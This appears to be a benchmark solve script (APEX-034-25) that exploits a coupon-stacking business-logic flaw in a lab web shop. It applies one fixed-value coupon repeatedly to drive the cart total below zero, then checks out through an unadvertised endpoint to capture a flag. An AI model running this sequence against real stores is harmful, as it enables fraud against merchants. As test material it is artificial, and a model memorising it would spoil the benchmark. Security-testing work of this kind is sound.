#!/usr/bin/env bash
# APEX-034-25 — "Business Logic - Coupon/Discount Abuse" (tags: business_logic)
#
# Nothing here is injected and nothing is malformed. Every request is one the
# API documents. The shop simply never decided that a coupon may be used once,
# so applying the same fixed-value coupon enough times takes the total below
# zero, and checkout never decided that a total has a floor.
#
# This is the class of flaw a scanner cannot find, because there is no payload
# to send — only a sequence of ordinary requests in an order nobody intended.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:PORT}"
. "$(dirname "$0")/lib.sh"
SESSION="apex034-$$"
trap '"$H5I" browser close --session "$SESSION" >/dev/null 2>&1' EXIT

"$H5I" browser open "$URL/api/products" --session "$SESSION" --new --capture >/dev/null

read -r PRODUCT PRICE <<<"$("$H5I" websec show res_0 --session "$SESSION" --raw | body |
    python3 -c '
import json, sys
for item in json.load(sys.stdin)["products"]:
    if "flag" in item["name"].lower():
        print(item["id"], item["price"])
        break
')"

read -r COUPON VALUE <<<"$(send "$SESSION" req_0 --set path=/api/coupons | body |
    python3 -c '
import json, sys
fixed = [c for c in json.load(sys.stdin)["coupons"] if c["type"] == "fixed"]
best = max(fixed, key=lambda c: float(c["value"]))
print(best["code"], best["value"])
')"

send "$SESSION" req_0 --create \
    --set method=POST --set path=/api/cart/add \
    --set header.Content-Type=application/json \
    --set "json.productId=$PRODUCT" --set json.quantity=1 >/dev/null

TIMES="$(python3 -c "import math,sys; print(int(float('$PRICE') / float('$VALUE')) + 1)")"
for _ in $(seq 1 "$TIMES"); do
    send "$SESSION" req_0 --create \
        --set method=POST --set path=/api/cart/apply-coupon \
        --set header.Content-Type=application/json \
        --set "json.code=$COUPON" >/dev/null
done

# `/api/orders/checkout`, not the `/api/checkout` the API's own index advertises.
send "$SESSION" req_0 --create --set method=POST --set path=/api/orders/checkout \
    --set header.Content-Type=application/json | flag
